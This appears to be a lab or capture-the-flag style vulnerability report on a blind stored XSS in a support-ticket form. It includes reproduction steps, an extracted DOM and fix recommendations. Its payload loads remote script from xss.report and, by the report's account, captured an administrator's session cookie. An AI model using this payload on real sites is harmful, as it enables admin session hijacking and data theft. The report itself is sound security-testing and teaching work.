Lab name : Blind XSS - ZAP-Hosting
# Title
Blind Cross-Site Scripting (XSS) via Support Ticket Submission Leading to Admin Session Compromise

# Vulnerability Type
Blind Cross-Site Scripting (XSS) / Stored XSS

# Summary
The application is vulnerable to Blind Cross-Site Scripting (XSS) through the public "Create ticket via mail" support form. The application fails to properly sanitize or encode user-supplied input before storing it in the database. When a support agent or administrator logs into the backend admin panel and views the submitted ticket (`/index.php?view=ticket&id=3`), the malicious JavaScript payload executes automatically in the administrator's browser context. This allows an attacker to execute arbitrary code within the privileged administrator session.

# Vulnerable Endpoint
- `https://contact.pwnedbox.site/#` (Injection Point)
- `https://contact.pwnedbox.site/index.php?view=ticket&id=3` (Execution Point)

# Vulnerable Parameter
Based on the admin panel screenshots, the following parameters are vulnerable and reflect the payload unsanitized:
- `Your name` (Reflected in the "NAME (OPTIONAL)" field)
- `Subject` (Reflected in the "SUBJECT" field)
- `Your message` (Reflected in the "MESSAGE" field)

# Steps to Reproduce
1. Navigate to the support page: `https://contact.pwnedbox.site/#`
2. Click on the **"Create ticket via mail"** button.
3. In the **"Your name"**, **"Subject"**, and **"Your message"** fields, insert the following payload:  
    `"><img/src/onerror=import('//xss.report/c/cyberbro')>`
4. Fill in the remaining required fields (Your E-Mail, reCAPTCHA) and click **"Submit"**.
5. Wait for the support agent/administrator to log in and view the submitted ticket in the admin panel.
6. Observe the out-of-band interaction on `xss.report`. The tool successfully captures the execution, recording the admin's `PHPSESSID` cookie, the URI (`/index.php?view=ticket&id=3`), and the Referrer (`/index.php?view=admin`), confirming the payload executed in the admin's browser.

# Payload Used 
`"><img/src/onerror=import('//xss.report/c/cyberbro')>`

# Proof of Concept
<img width="1920" height="1036" alt="1" src="https://github.com/user-attachments/assets/e161bcd6-105a-4e36-bd68-843c4f2d3704" />
<img width="1920" height="1032" alt="2" src="https://github.com/user-attachments/assets/8b925dde-19b2-4f98-ab75-c30635ef6a2f" />
<img width="1920" height="1034" alt="3" src="https://github.com/user-attachments/assets/1436afac-ba71-4ff3-bc42-2ce941274bcb" />
<img width="1920" height="1038" alt="4" src="https://github.com/user-attachments/assets/3739faac-050f-485b-9a75-97b6932cf2fd" />
<img width="1920" height="1039" alt="5" src="https://github.com/user-attachments/assets/c90e48e4-45e6-40ff-baba-88296ed3ffc5" />

# Extracted DOM
```js
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Feedback #1</title><link rel="stylesheet" href="../assets/style.css?v=2"></head><body><header class="nav"><a class="brand" href="../index.php"><span class="brand-mark">&lt;/&gt;</span> ClientFlow</a><nav><a href="dashboard.php">← Dashboard</a><a href="users.php">Accounts</a><a href="logout.php">Logout</a></nav></header><main class="dashboard-wrap"><div class="page-title"><span class="eyebrow">SUBMISSION #1</span><h1>General feedback</h1></div><section class="panel detail"><div class="detail-grid"><div><span>Sender</span><strong>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></strong></div><div><span>Email</span><strong>hello@gmail.com</strong></div><div><span>Submitted</span><strong>2026-10-22 06:13:05</strong></div><div><span>Status</span><strong>new</strong></div></div><h3>Message</h3><div class="safe-output">'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></div><form method="post" action="update_feedback.php" class="inline-form"><input type="hidden" name="csrf" value="62fc24004a71183be4ea5cb46427822cea35389f7f973cd2c2cda48bfdf7ab1f"><input type="hidden" name="id" value="1"><select name="status"><option selected="">new</option><option>reviewed</option><option>resolved</option></select><button class="btn primary small">Update Status</button></form></section></main><script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;534dbc1854e3437aa1164d09110b7f47&quot;,&quot;r&quot;:1,&quot;spa&quot;:2}" crossorigin="anonymous"></script>

</body></html>
```

# Impact
Because this is a Blind XSS, the payload executes in the browser of an internal user (specifically, the site administrator) when they view the infected inquiries. This is a critical vulnerability. An attacker can perform the following actions:

- **Session Hijacking & Admin Account Takeover:** Steal the administrator's session cookie (`PHPSESSID`), allowing the attacker to completely bypass authentication and take over the admin account.
- **Privileged Actions:** The script can make authenticated requests on behalf of the administrator to perform sensitive actions, such as altering site content, viewing sensitive customer data, or creating new admin users.
- **Exfiltration of Sensitive Data:** The payload can read the contents of the admin dashboard or internal pages and send them to an attacker-controlled server.

# Recommendation for fix
1. **Output Encoding:** Apply context-aware HTML entity encoding to **all** user-supplied data before rendering it in **any** interface, including backend administrative panels (e.g., convert `<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;`). The backend must be treated with the same security rigor as the public-facing frontend.
2. **Input Sanitization:** Use a reputable HTML sanitization library (such as DOMPurify) to strip dangerous tags and attributes from user input before storing it in the database. If rich text is not required, strip all HTML tags entirely.
3. **Content Security Policy (CSP):** Deploy a strict CSP header on the administrative backend to prevent the execution of inline scripts and unauthorized external scripts as a defense-in-depth measure.
4. **Secure Cookies:** Ensure all session cookies (like `PHPSESSID`) use the `HttpOnly` and `Secure` flags to prevent JavaScript from accessing them, mitigating the risk of session hijacking even if an XSS occurs.

